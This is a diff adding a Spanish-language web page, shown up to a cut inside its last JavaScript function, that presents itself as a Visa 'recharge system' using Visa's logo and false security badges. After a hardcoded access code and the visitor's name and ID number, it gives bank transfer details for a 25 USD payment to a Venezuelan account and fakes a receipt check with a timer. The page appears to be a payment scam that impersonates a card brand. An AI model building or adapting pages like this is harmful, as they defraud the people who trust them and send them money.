@@ -1,0 +1,1219 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sistema de Recarga - Pasarela Segura Visa</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        /* Variables de color Visa corporativo */
+        :root {
+            --primary-color: #1a1f71; /* Azul Visa */
+            --secondary-color: #f7b600; /* Dorado Visa */
+            --accent-color: #0055c8; /* Azul acento */
+            --text-color: #2a2a2a;
+            --text-secondary: #666;
+            --background-color: #fafbfc;
+            --card-color: #fff;
+            --error-color: #d14124;
+            --success-color: #17a84b;
+            --light-color: #f2f4f8;
+            --border-color: #e0e4e8;
+            --visa-gradient: linear-gradient(135deg, #1a1f71 0%, #142787 100%);
+            --visa-accent-gradient: linear-gradient(135deg, #f7b600 0%, #f5a700 100%);
+            --box-shadow: 0 10px 25px rgba(26, 31, 113, 0.06);
+        }
+        
+        /* Estilos base */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+        }
+        
+        /* Animación de onda refinada */
+        @property --a {
+            syntax: "<angle>";
+            initial-value: 0deg;
+            inherits: true;
+        }
+        
+        body {
+            background-color: var(--background-color);
+            color: var(--text-color);
+            line-height: 1.6;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            position: relative;
+            overflow-x: hidden;
+            letter-spacing: -0.01em;
+            font-weight: 400;
+        }
+        
+        /* Fondo animado mejorado */
+        .background-wave {
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            z-index: -1;
+            opacity: 0.03;
+            overflow: hidden;
+        }
+        
+        .wave-container {
+            display: flex;
+            width: 100vw;
+            height: 100vh;
+            animation: main 12s cubic-bezier(0.76, 0.05, 0.2, 0.96) infinite;
+        }
+        
+        @keyframes main {
+            from { --a: 0deg; }
+            to { --a: 360deg; }
+        }
+        
+        .wave-col {
+            flex: 1;
+            --i: 0;
+            --a-per-item: calc(140deg / 24 * var(--i) - var(--a));
+            --pos1: calc(50% * cos(var(--a-per-item)));
+            background: linear-gradient(
+                to bottom,
+                var(--secondary-color),
+                var(--accent-color) var(--pos1),
+                var(--primary-color) 50%,
+                var(--accent-color) calc(100% - var(--pos1)),
+                var(--secondary-color)
+            );
+        }
+        
+        /* Generamos columnas de onda */
+        .wave-col:nth-child(1) { --i: 0; }
+        .wave-col:nth-child(2) { --i: 1; }
+        .wave-col:nth-child(3) { --i: 2; }
+        .wave-col:nth-child(4) { --i: 3; }
+        .wave-col:nth-child(5) { --i: 4; }
+        .wave-col:nth-child(6) { --i: 5; }
+        .wave-col:nth-child(7) { --i: 6; }
+        .wave-col:nth-child(8) { --i: 7; }
+        .wave-col:nth-child(9) { --i: 8; }
+        .wave-col:nth-child(10) { --i: 9; }
+        .wave-col:nth-child(11) { --i: 10; }
+        .wave-col:nth-child(12) { --i: 11; }
+        .wave-col:nth-child(13) { --i: 12; }
+        .wave-col:nth-child(14) { --i: 13; }
+        .wave-col:nth-child(15) { --i: 14; }
+        .wave-col:nth-child(16) { --i: 15; }
+        .wave-col:nth-child(17) { --i: 16; }
+        .wave-col:nth-child(18) { --i: 17; }
+        .wave-col:nth-child(19) { --i: 18; }
+        .wave-col:nth-child(20) { --i: 19; }
+        .wave-col:nth-child(21) { --i: 20; }
+        .wave-col:nth-child(22) { --i: 21; }
+        .wave-col:nth-child(23) { --i: 22; }
+        .wave-col:nth-child(24) { --i: 23; }
+        
+        /* Contenedor principal */
+        .container {
+            max-width: 800px;
+            margin: 30px auto;
+            padding: 20px;
+            position: relative;
+            z-index: 1;
+        }
+        
+        /* Encabezado con logo */
+        .header {
+            text-align: center;
+            margin-bottom: 45px;
+            position: relative;
+        }
+        
+        .logo-container {
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        
+        .logo {
+            max-width: 100px;
+            height: auto;
+            filter: drop-shadow(0 4px 6px rgba(0,0,0,0.08));
+            transition: all 0.3s ease;
+        }
+        
+        /* Tipografía refinada */
+        h1, h2, h3 {
+            color: var(--primary-color);
+            letter-spacing: -0.02em;
+            font-weight: 600;
+        }
+        
+        h1 {
+            font-size: 28px;
+            margin-bottom: 12px;
+            font-weight: 700;
+        }
+        
+        h2 {
+            font-size: 22px;
+            margin-bottom: 18px;
+            font-weight: 600;
+        }
+        
+        h3 {
+            font-size: 18px;
+            margin-bottom: 10px;
+        }
+        
+        p {
+            color: var(--text-secondary);
+            margin-bottom: 20px;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+        
+        /* Tarjetas para formularios */
+        .card {
+            background-color: var(--card-color);
+            border-radius: 20px;
+            box-shadow: var(--box-shadow);
+            padding: 40px;
+            margin-bottom: 30px;
+            transition: all 0.4s ease;
+            display: none;
+            border: 1px solid rgba(224, 228, 232, 0.6);
+            backdrop-filter: blur(10px);
+            -webkit-backdrop-filter: blur(10px);
+            position: relative;
+        }
+        
+        .card.active {
+            display: block;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        
+        /* Grupos de formulario */
+        .form-group {
+            margin-bottom: 28px;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 10px;
+            font-weight: 500;
+            color: var(--text-color);
+            font-size: 15px;
+        }
+        
+        input, select {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid var(--border-color);
+            border-radius: 12px;
+            font-size: 16px;
+            transition: all 0.25s ease;
+            background-color: var(--light-color);
+            color: var(--text-color);
+        }
+        
+        input:focus, select:focus {
+            outline: none;
+            border-color: var(--primary-color);
+            box-shadow: 0 0 0 4px rgba(26, 31, 113, 0.1);
+            background-color: white;
+        }
+        
+        /* Selector de documento refinado */
+        .document-input-group {
+            display: flex;
+            gap: 12px;
+        }
+        
+        .document-type {
+            width: 80px;
+            flex-shrink: 0;
+            font-weight: 500;
+            border-radius: 10px;
+            background-color: var(--light-color);
+            color: var(--primary-color);
+        }
+        
+        /* Botones elegantes */
+        .btn-container {
+            display: flex;
+            gap: 15px;
+            margin-top: 35px;
+            flex-direction: row;
+        }
+        
+        .btn {
+            background: var(--visa-gradient);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            padding: 16px 24px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s;
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            gap: 10px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(rgba(255,255,255,0.1), rgba(255,255,255,0));
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        .btn:hover::after {
+            opacity: 1;
+        }
+        
+        .btn:hover {
+            box-shadow: 0 8px 20px rgba(26, 31, 113, 0.25);
+            transform: translateY(-2px);
+        }
+        
+        .btn:active {
+            transform: translateY(1px);
+            box-shadow: 0 4px 10px rgba(26, 31, 113, 0.2);
+        }
+        
+        .btn-secondary {
+            background: white;
+            color: var(--primary-color);
+            border: 1px solid var(--border-color);
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.03);
+        }
+        
+        .btn-secondary:hover {
+            background: var(--light-color);
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.08);
+        }
+        
+        .btn-accent {
+            background: var(--visa-accent-gradient);
+        }
+        
+        .btn-copy {
+            background: transparent;
+            color: var(--primary-color);
+            border: none;
+            cursor: pointer;
+            padding: 8px;
+            font-size: 16px;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 8px;
+            position: relative;
+        }
+        
+        .btn-copy:hover {
+            background-color: rgba(26, 31, 113, 0.05);
+            transform: scale(1.05);
+        }
+        
+        /* Mensajes de error */
+        .error-message {
+            color: var(--error-color);
+            font-size: 14px;
+            margin-top: 8px;
+            font-weight: 500;
+            display: flex;
+            align-items: center;
+            gap: 6px;
+        }
+        
+        /* Indicador de pasos sofisticado */
+        .steps {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 40px;
+            position: relative;
+        }
+        
+        .steps::before {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background-color: var(--border-color);
+            z-index: 1;
+        }
+        
+        .step {
+            position: relative;
+            z-index: 2;
+            text-align: center;
+            width: 180px;
+            font-weight: 500;
+        }
+        
+        .step-icon {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            width: 40px;
+            height: 40px;
+            border-radius: 50%;
+            background-color: var(--light-color);
+            margin: 0 auto 10px;
+            color: var(--text-secondary);
+            font-weight: 600;
+            transition: all 0.4s ease;
+            position: relative;
+            z-index: 2;
+            border: 2px solid white;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.05);
+        }
+        
+        .step-text {
+            color: var(--text-secondary);
+            font-size: 14px;
+            transition: all 0.3s ease;
+            font-weight: 500;
+        }
+        
+        .step.active .step-icon {
+            background-color: var(--primary-color);
+            color: white;
+            box-shadow: 0 0 0 5px rgba(26, 31, 113, 0.1);
+        }
+        
+        .step.active .step-text {
+            color: var(--primary-color);
+            font-weight: 600;
+        }
+        
+        .step.completed .step-icon {
+            background-color: var(--success-color);
+            color: white;
+        }
+        
+        .step.completed .step-text {
+            color: var(--success-color);
+        }
+        
+        /* Tarjeta de datos */
+        .data-card {
+            background-color: var(--light-color);
+            border: 1px solid var(--border-color);
+            border-radius: 16px;
+            padding: 30px;
+            margin-top: 25px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 15px;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .data-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent, 
+                rgba(255, 255, 255, 0.4), 
+                transparent);
+            transition: 0.5s;
+        }
+        
+        .data-card:hover::before {
+            left: 100%;
+        }
+        
+        .data-card:hover {
+            background-color: white;
+            transform: translateY(-3px);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.08);
+            border-color: rgba(26, 31, 113, 0.15);
+        }
+        
+        .data-card i {
+            font-size: 28px;
+            color: var(--primary-color);
+            margin-bottom: 5px;
+        }
+        
+        /* Overlay de datos de recarga */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(15px);
+            -webkit-backdrop-filter: blur(15px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 1000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .overlay.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .payment-data-card {
+            background-color: white;
+            padding: 35px;
+            border-radius: 24px;
+            max-width: 500px;
+            width: 90%;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.25);
+            position: relative;
+            transform: translateY(20px);
+            transition: transform 0.4s ease;
+        }
+        
+        .overlay.active .payment-data-card {
+            transform: translateY(0);
+        }
+        
+        .payment-data-item {
+            margin-bottom: 20px;
+            padding-bottom: 20px;
+            border-bottom: 1px solid var(--border-color);
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        
+        .payment-data-item:last-child {
+            border-bottom: none;
+            margin-bottom: 10px;
+        }
+        
+        .payment-data-label {
+            font-weight: 600;
+            color: var(--primary-color);
+            margin-bottom: 5px;
+            font-size: 15px;
+        }
+        
+        .payment-data-content {
+            flex: 1;
+            padding-left: 15px;
+            font-weight: 500;
+            color: var(--text-color);
+        }
+        
+        .payment-data-hidden {
+            display: none;
+        }
+        
+        .payment-data-hidden.visible {
+            display: flex;
+            animation: fadeIn 0.5s ease;
+        }
+        
+        .close-btn {
+            display: block;
+            margin: 25px auto 0;
+            max-width: 200px;
+        }
+        
+        /* Módulo de seguridad */
+        .visa-security {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-top: 35px;
+            gap: 12px;
+            padding: 16px;
+            border-radius: 16px;
+            background-color: var(--light-color);
+            border: 1px solid var(--border-color);
+        }
+        
+        .visa-security img {
+            height: 25px;
+        }
+        
+        .security-text {
+            font-size: 14px;
+            color: var(--text-secondary);
+            font-weight: 500;
+        }
+        
+        /* Soporte */
+        .support-link {
+            text-align: center;
+            margin-top: 25px;
+            color: var(--primary-color);
+            font-size: 14px;
+        }
+        
+        .support-link a {
+            color: var(--primary-color);
+            text-decoration: none;
+            font-weight: 500;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+            transition: all 0.2s ease;
+            padding: 8px 12px;
+            border-radius: 8px;
+        }
+        
+        .support-link a:hover {
+            color: var(--accent-color);
+            background-color: rgba(26, 31, 113, 0.05);
+        }
+        
+        /* Spinner de carga */
+        .spinner-container {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(255, 255, 255, 0.9);
+            backdrop-filter: blur(5px);
+            -webkit-backdrop-filter: blur(5px);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 2000;
+            opacity: 0;
+            visibility: hidden;
+            transition: all 0.3s ease;
+        }
+        
+        .spinner-container.active {
+            opacity: 1;
+            visibility: visible;
+        }
+        
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(26, 31, 113, 0.1);
+            border-radius: 50%;
+            border-top-color: var(--primary-color);
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .processing-text {
+            font-size: 18px;
+            color: var(--primary-color);
+            font-weight: 600;
+            margin-top: 10px;
+        }
+        
+        /* Check de validación recibida */
+        .checkmark-container {
+            display: none;
+        }
+        
+        .checkmark-container.active {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+        }
+        
+        .checkmark-circle {
+            width: 70px;
+            height: 70px;
+            position: relative;
+            background: var(--success-color);
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 20px;
+            transform: scale(0);
+            animation: scaleIn 0.5s ease forwards;
+            box-shadow: 0 8px 20px rgba(23, 168, 75, 0.25);
+        }
+        
+        @keyframes scaleIn {
+            100% { transform: scale(1); }
+        }
+        
+        .checkmark {
+            color: white;
+            font-size: 32px;
+        }
+        
+        .success-text {
+            font-size: 20px;
+            color: var(--success-color);
+            font-weight: 600;
+            margin-bottom: 15px;
+            opacity: 0;
+            animation: fadeIn 0.5s ease 0.3s forwards;
+            text-align: center;
+        }
+        
+        .validation-note {
+            font-size: 14px;
+            color: var(--text-secondary);
+            margin-bottom: 20px;
+            text-align: center;
+            max-width: 300px;
+            opacity: 0;
+            animation: fadeIn 0.5s ease 0.5s forwards;
+        }
+
+        /* Tooltip para confirmación de copia */
+        .tooltip {
+            position: absolute;
+            background-color: var(--primary-color);
+            color: white;
+            padding: 6px 12px;
+            border-radius: 8px;
+            font-size: 12px;
+            font-weight: 500;
+            top: -35px;
+            right: 0;
+            opacity: 0;
+            transition: opacity 0.3s ease, transform 0.3s ease;
+            pointer-events: none;
+            transform: translateY(5px);
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.15);
+        }
+        
+        .tooltip.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        
+        /* Sombra decorativa */
+        .card::after {
+            content: '';
+            position: absolute;
+            bottom: -20px;
+            left: 5%;
+            right: 5%;
+            height: 20px;
+            z-index: -1;
+            border-radius: 50%;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+        }
+        
+        /* Estilo para dispositivos móviles */
+        @media (max-width: 768px) {
+            .card {
+                padding: 30px 20px;
+            }
+            
+            .btn-container {
+                flex-direction: column-reverse;
+            }
+            
+            .steps {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 20px;
+            }
+            
+            .steps::before {
+                display: none;
+            }
+            
+            .step {
+                display: flex;
+                align-items: center;
+                width: 100%;
+                gap: 15px;
+            }
+            
+            .step-icon {
+                margin: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+    <!-- Fondo de onda animado -->
+    <div class="background-wave">
+        <div class="wave-container">
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+            <div class="wave-col"></div>
+        </div>
+    </div>
+
+    <div class="container">
+        <div class="header">
+            <div class="logo-container">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Logo" class="logo">
+            </div>
+            <h1>Sistema de Recarga</h1>
+            <p>Portal seguro para activación de cuentas y transacciones protegidas</p>
+        </div>
+        
+        <div class="steps">
+            <div class="step active" id="step-1">
+                <div class="step-icon">1</div>
+                <div class="step-text">Inicio de Sesión</div>
+            </div>
+            <div class="step" id="step-2">
+                <div class="step-icon">2</div>
+                <div class="step-text">Datos Personales</div>
+            </div>
+            <div class="step" id="step-3">
+                <div class="step-icon">3</div>
+                <div class="step-text">Información de Recarga</div>
+            </div>
+        </div>
+        
+        <!-- Formulario de Inicio de Sesión -->
+        <div class="card active" id="login-form">
+            <h2>Ingreso al Sistema</h2>
+            <p>Ingrese su clave de acceso y nombre para continuar con el proceso de activación</p>
+            
+            <div class="form-group">
+                <label for="access-code">Clave de Acceso:</label>
+                <input type="password" id="access-code" placeholder="Ingrese su clave de acceso">
+                <div class="error-message" id="code-error"></div>
+            </div>
+            
+            <div class="form-group">
+                <label for="user-name">Nombre Completo:</label>
+                <input type="text" id="user-name" placeholder="Ingrese su nombre completo">
+                <div class="error-message" id="name-error"></div>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn" onclick="validateLogin()">
+                    Continuar
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+            </div>
+            
+            <div class="visa-security">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Secure">
+                <span class="security-text">Conexión Segura · Encriptación SSL · Pasarela Protegida</span>
+            </div>
+            
+            <div class="support-link">
+                <a href="tel:+17373018059">
+                    <i class="fas fa-headset"></i>
+                    Soporte Técnico: +1 737-301-8059
+                </a>
+            </div>
+        </div>
+        
+        <!-- Formulario de Datos Personales -->
+        <div class="card" id="user-data-form">
+            <h2>Datos Personales</h2>
+            <p>Complete su información personal para continuar con el proceso de activación</p>
+            
+            <div class="form-group">
+                <label for="full-name">Nombre Completo:</label>
+                <input type="text" id="full-name" placeholder="Ingrese su nombre completo">
+                <div class="error-message" id="fullname-error"></div>
+            </div>
+            
+            <div class="form-group">
+                <label for="id-number">Cédula de Identidad:</label>
+                <div class="document-input-group">
+                    <select class="document-type" id="doc-type">
+                        <option value="V">V</option>
+                        <option value="E">E</option>
+                        <option value="J">J</option>
+                    </select>
+                    <input type="text" id="id-number" placeholder="Ingrese su número de identidad">
+                </div>
+                <div class="error-message" id="id-error"></div>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary" onclick="goBack('user-data-form', 'login-form')">
+                    <i class="fas fa-arrow-left"></i>
+                    Volver
+                </button>
+                <button class="btn" onclick="validateUserData()">
+                    Continuar
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+            </div>
+            
+            <div class="support-link">
+                <a href="tel:+17373018059">
+                    <i class="fas fa-headset"></i>
+                    Soporte Técnico: +1 737-301-8059
+                </a>
+            </div>
+        </div>
+        
+        <!-- Información de Recarga -->
+        <div class="card" id="payment-info">
+            <h2>Información de Recarga</h2>
+            <p>Para realizar la recarga, utilice los siguientes datos para hacer la transferencia:</p>
+            
+            <div class="data-card" onclick="showPaymentData()">
+                <i class="fas fa-credit-card"></i>
+                <h3>Ver Datos para Recarga</h3>
+                <p>Haga clic aquí para ver la información necesaria para realizar la transferencia</p>
+            </div>
+            
+            <div class="form-group" style="margin-top: 30px;">
+                <label for="confirmation">Número de Comprobante:</label>
+                <input type="text" id="confirmation" placeholder="Ingrese el número de referencia de la transferencia">
+                <div class="error-message" id="confirmation-error"></div>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary" onclick="goBack('payment-info', 'user-data-form')">
+                    <i class="fas fa-arrow-left"></i>
+                    Volver
+                </button>
+                <button class="btn" onclick="confirmPayment()">
+                    Enviar Comprobante
+                    <i class="fas fa-check"></i>
+                </button>
+            </div>
+            
+            <div class="visa-security">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="VISA Secure">
+                <span class="security-text">Conexión Segura · Procesamiento Visa · Protección al Consumidor</span>
+            </div>
+            
+            <div class="support-link">
+                <a href="tel:+17373018059">
+                    <i class="fas fa-headset"></i>
+                    Soporte Técnico: +1 737-301-8059
+                </a>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Overlay para mostrar datos de recarga -->
+    <div class="overlay" id="payment-overlay">
+        <div class="payment-data-card">
+            <h2>Información de Transacción</h2>
+            
+            <div class="payment-data-item">
+                <div class="payment-data-label">Banco:</div>
+                <div class="payment-data-content">Banco Venezolano de Crédito</div>
+                <button class="btn-copy" onclick="copyToClipboard('Banco Venezolano de Crédito', this)">
+                    <i class="fas fa-copy"></i>
+                    <span class="tooltip">¡Copiado!</span>
+                </button>
+            </div>
+            
+            <div class="payment-data-item">
+                <div class="payment-data-label">RIF:</div>
+                <div class="payment-data-content">J 404757732</div>
+                <button class="btn-copy" onclick="copyToClipboard('J 404757732', this)">
+                    <i class="fas fa-copy"></i>
+                    <span class="tooltip">¡Copiado!</span>
+                </button>
+            </div>
+            
+            <div class="payment-data-item">
+                <div class="payment-data-label">Teléfono:</div>
+                <div class="payment-data-content">0412 200 00 00</div>
+                <button class="btn-copy" onclick="copyToClipboard('0412 200 00 00', this)">
+                    <i class="fas fa-copy"></i>
+                    <span class="tooltip">¡Copiado!</span>
+                </button>
+            </div>
+            
+            <div class="payment-data-item payment-data-hidden" id="amount-data">
+                <div class="payment-data-label">Monto:</div>
+                <div class="payment-data-content">25 USD (2,850.25 Bs a tasa 114.01)</div>
+                <button class="btn-copy" onclick="copyToClipboard('25 USD (2,850.25 Bs a tasa 114.01)', this)">
+                    <i class="fas fa-copy"></i>
+                    <span class="tooltip">¡Copiado!</span>
+                </button>
+            </div>
+            
+            <div class="payment-data-item">
+                <div class="payment-data-label">Concepto:</div>
+                <div class="payment-data-content">548454</div>
+                <button class="btn-copy" onclick="copyToClipboard('548454', this)">
+                    <i class="fas fa-copy"></i>
+                    <span class="tooltip">¡Copiado!</span>
+                </button>
+            </div>
+            
+            <div class="btn-container">
+                <button class="btn btn-secondary close-btn" onclick="hidePaymentData()">
+                    <i class="fas fa-times"></i>
+                    Cerrar
+                </button>
+                <button class="btn btn-accent" onclick="showAmount()" id="show-amount-btn">
+                    <i class="fas fa-eye"></i>
+                    Mostrar Monto
+                </button>
+            </div>
+        </div>
+    </div>
+    
+    <!-- Contenedor de validación y estado de la recarga -->
+    <div class="spinner-container" id="spinner-container">
+        <div class="spinner"></div>
+        <div class="processing-text">Validando comprobante...</div>
+        
+        <div class="checkmark-container" id="checkmark-container">
+            <div class="checkmark-circle">
+                <i class="fas fa-check checkmark"></i>
+            </div>
+            <div class="success-text">¡Comprobante recibido!</div>
+            <div class="validation-note">La validación puede tomar hasta 24 horas. La recarga se aplicará en cuanto se confirme el pago.</div>
+            <button class="btn" onclick="completeProcess()" style="max-width: 250px;">
+                Finalizar
+            </button>
+        </div>
+    </div>
+    
+    <script>
+        // Mostrar primer formulario al cargar
+        document.addEventListener('DOMContentLoaded', function() {
+            document.getElementById('login-form').classList.add('active');
+        });
+        
+        // Validar inicio de sesión
+        function validateLogin() {
+            const accessCode = document.getElementById('access-code').value;
+            const userName = document.getElementById('user-name').value;
+            let isValid = true;
+            
+            // Validar código de acceso
+            if (accessCode.trim() === '') {
+                document.getElementById('code-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese su código de acceso';
+                isValid = false;
+            } else if (accessCode !== '01010101010101010101') {
+                document.getElementById('code-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Código de acceso incorrecto';
+                isValid = false;
+            } else {
+                document.getElementById('code-error').textContent = '';
+            }
+            
+            // Validar nombre
+            if (userName.trim() === '') {
+                document.getElementById('name-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese su nombre';
+                isValid = false;
+            } else {
+                document.getElementById('name-error').textContent = '';
+            }
+            
+            // Si todo es válido, pasar al siguiente paso
+            if (isValid) {
+                document.getElementById('login-form').classList.remove('active');
+                document.getElementById('user-data-form').classList.add('active');
+                document.getElementById('step-1').classList.remove('active');
+                document.getElementById('step-1').classList.add('completed');
+                document.getElementById('step-2').classList.add('active');
+                
+                // Pre-llenar el nombre en el siguiente formulario
+                document.getElementById('full-name').value = userName;
+            }
+        }
+        
+        // Validar datos de usuario
+        function validateUserData() {
+            const fullName = document.getElementById('full-name').value;
+            const idNumber = document.getElementById('id-number').value;
+            const docType = document.getElementById('doc-type').value;
+            let isValid = true;
+            
+            // Validar nombre completo
+            if (fullName.trim() === '') {
+                document.getElementById('fullname-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese su nombre completo';
+                isValid = false;
+            } else {
+                document.getElementById('fullname-error').textContent = '';
+            }
+            
+            // Validar cédula
+            if (idNumber.trim() === '') {
+                document.getElementById('id-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese su número de identidad';
+                isValid = false;
+            } else if (!/^\d+$/.test(idNumber)) {
+                document.getElementById('id-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Formato inválido. Solo números sin guiones';
+                isValid = false;
+            } else {
+                document.getElementById('id-error').textContent = '';
+            }
+            
+            // Si todo es válido, pasar al siguiente paso
+            if (isValid) {
+                document.getElementById('user-data-form').classList.remove('active');
+                document.getElementById('payment-info').classList.add('active');
+                document.getElementById('step-2').classList.remove('active');
+                document.getElementById('step-2').classList.add('completed');
+                document.getElementById('step-3').classList.add('active');
+            }
+        }
+        
+        // Mostrar overlay con datos de recarga
+        function showPaymentData() {
+            document.getElementById('payment-overlay').classList.add('active');
+            // Reiniciar estado del monto al abrir
+            document.getElementById('amount-data').classList.remove('visible');
+            document.getElementById('show-amount-btn').innerHTML = '<i class="fas fa-eye"></i> Mostrar Monto';
+        }
+        
+        // Mostrar el monto
+        function showAmount() {
+            const amountData = document.getElementById('amount-data');
+            const showBtn = document.getElementById('show-amount-btn');
+            
+            if (amountData.classList.contains('visible')) {
+                amountData.classList.remove('visible');
+                showBtn.innerHTML = '<i class="fas fa-eye"></i> Mostrar Monto';
+            } else {
+                amountData.classList.add('visible');
+                showBtn.innerHTML = '<i class="fas fa-eye-slash"></i> Ocultar Monto';
+            }
+        }
+        
+        // Ocultar overlay
+        function hidePaymentData() {
+            document.getElementById('payment-overlay').classList.remove('active');
+        }
+        
+        // Función para copiar al portapapeles
+        function copyToClipboard(text, button) {
+            navigator.clipboard.writeText(text).then(function() {
+                // Mostrar tooltip
+                const tooltip = button.querySelector('.tooltip');
+                tooltip.classList.add('active');
+                
+                // Ocultar tooltip después de 2 segundos
+                setTimeout(function() {
+                    tooltip.classList.remove('active');
+                }, 2000);
+            });
+        }
+        
+        // Enviar comprobante
+        function confirmPayment() {
+            const confirmation = document.getElementById('confirmation').value;
+            
+            if (confirmation.trim() === '') {
+                document.getElementById('confirmation-error').innerHTML = '<i class="fas fa-exclamation-circle"></i> Por favor ingrese el número de referencia de la transferencia';
+                return;
+            } else {
+                document.getElementById('confirmation-error').textContent = '';
+            }
+            
+            // Mostrar spinner
+            const spinnerContainer = document.getElementById('spinner-container');
+            spinnerContainer.classList.add('active');
+            
+            // Simular proceso de validación (3 segundos)
+            setTimeout(function() {
+                // Ocultar spinner y mostrar checkmark
+                document.querySelector('.spinner').style.display = 'none';
+                document.querySelector('.processing-text').style.display = 'none';
+                document.getElementById('checkmark-container').classList.add('active');
+            }, 3000);
+        }
+        
+        // Completar proceso
+        function completeProcess() {
+            // Ocultar spinner container
+            document.getElementById('spinner-container').classList.remove('active');
+            
+            // Mostrar mensaje final (simulación)
+            alert('Su comprobante ha sido registrado. La recarga será procesada en las próximas 24 horas una vez validada la transferencia.');
+            
+            // Reiniciar la interfaz (en una aplicación real redirigiría a otra página)
+            setTimeout(function() {
+                location.reload();
+            }, 1000);
+        }
+        
+        // Función para volver al paso anterior
+        function goBack(currentFormId, previousFormId) {
+            document.getElementById(currentFormId).classList.remove('active');
+            document.getElementById(previousFormId).classList.add('active');
+            
